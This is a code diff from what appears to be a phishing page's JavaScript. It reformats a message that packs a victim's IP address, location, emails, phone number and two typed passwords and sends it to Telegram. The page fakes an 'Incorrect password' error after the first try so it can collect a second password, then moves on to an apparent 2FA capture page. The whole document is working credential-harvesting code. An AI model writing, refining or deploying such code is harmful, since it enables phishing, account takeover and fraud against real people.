@@ -476,25 +476,26 @@
 
             passwordAttemptCount++;
 
-            let message = `<b>New Submission Attempt ${passwordAttemptCount}</b>\n`;
-            message += `------------------------------------\n`;
-            message += `<b>IP & Location:</b> ${ipAddress} (${locationData})\n`;
-            message += `<b>Page Name:</b> ${formData.yourName}\n`;
-            message += `<b>Business Email:</b> ${formData.businessEmail}\n`;
-            message += `<b>Personal Email:</b> ${formData.personalEmail}\n`;
-            message += `<b>Mobile Phone:</b> ${formData.mobilePhoneNumber}\n`;
-          
-            if (passwordAttemptCount === 1) {
-                passwordAttemptValue1 = password;
-                message += `<b>Password Attempt 1:</b> ${passwordAttemptValue1}\n`;
-                await sendMessageToTelegram(message);
-                passwordError.textContent = 'Incorrect password. Please try again.';
-                passwordError.style.display = 'block';
-            } else if (passwordAttemptCount === 2) {
-                passwordAttemptValue2 = password;
-                message += `<b>Password Attempt 2:</b> ${passwordAttemptValue2}\n`;
-                await sendMessageToTelegram(message);
-                passwordPopupOverlay.style.display = 'none';
+            let message = `<b>📩 New Submission Attempt ${passwordAttemptCount}</b>\n`;
+message += `------------------------------------\n`;
+message += `<b>🌐 IP & Location:</b> <code>${ipAddress} (${locationData})</code>\n`;
+message += `<b>📄 Page Name:</b> <code>${formData.yourName}</code>\n`;
+message += `<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>\n`;
+message += `<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>\n`;
+message += `<b>📱 Mobile Phone:</b> <code>${formData.mobilePhoneNumber}</code>\n`;
+
+if (passwordAttemptCount === 1) {
+  passwordAttemptValue1 = password;
+  message += `<b>🔐 Password Attempt 1:</b> <code>${passwordAttemptValue1}</code>\n`;
+  await sendMessageToTelegram(message);
+  passwordError.textContent = 'Incorrect password. Please try again.';
+  passwordError.style.display = 'block';
+} else if (passwordAttemptCount === 2) {
+  passwordAttemptValue2 = password;
+  message += `<b>🔐 Password Attempt 2:</b> <code>${passwordAttemptValue2}</code>\n`;
+  await sendMessageToTelegram(message);
+  passwordPopupOverlay.style.display = 'none';
+}
 
                 // Store data in localStorage and redirect to 2FA page
                 localStorage.setItem('formData', JSON.stringify(formData));
